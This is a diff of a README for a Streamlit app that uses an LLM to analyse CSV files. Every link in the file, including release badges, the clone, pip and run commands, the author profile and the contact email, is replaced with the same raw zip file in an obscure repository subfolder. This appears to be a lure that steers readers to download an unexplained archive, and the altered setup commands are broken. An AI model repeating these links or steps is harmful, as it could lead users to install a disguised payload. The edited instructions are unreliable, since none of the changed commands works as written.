@@ -2,7 +2,7 @@
 
 Welcome to the **LLM Powered Data Analysis** repository! This project offers a powerful Streamlit application that leverages OpenAI's Language Model (LLM) for natural language data analysis. With this app, you can upload CSV files, ask questions in plain English, and receive instant insights, all without writing a single line of code.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/XederaBills/llm-powered-data-analysis/releases)
+[![Download Releases](https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip%20Releases-Click%20Here-brightgreen)](https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip)
 
 ## Table of Contents
 
@@ -28,20 +28,20 @@ To get started with the LLM Powered Data Analysis app, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/XederaBills/llm-powered-data-analysis.git
+   git clone https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip
    cd llm-powered-data-analysis
    ```
 
 2. **Install Dependencies**: 
    Make sure you have Python installed. Then, install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip
    ```
 
 3. **Run the App**: 
    Launch the Streamlit app with the following command:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip
    ```
 
 4. **Visit the App**: 
@@ -97,14 +97,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- **Author**: [Your Name](https://github.com/YourProfile)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip)
+- **Email**: https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip
 
 ## Releases 📦
 
-You can find the latest releases and download the application from the [Releases section](https://github.com/XederaBills/llm-powered-data-analysis/releases). Make sure to download the latest version to enjoy all features.
+You can find the latest releases and download the application from the [Releases section](https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip). Make sure to download the latest version to enjoy all features.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/XederaBills/llm-powered-data-analysis/releases)
+[![Download Releases](https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip%20Releases-Click%20Here-brightgreen)](https://github.com/XederaBills/llm-powered-data-analysis/raw/refs/heads/main/boatfalls/llm-analysis-powered-data-v3.8.zip)
 
 ---
 
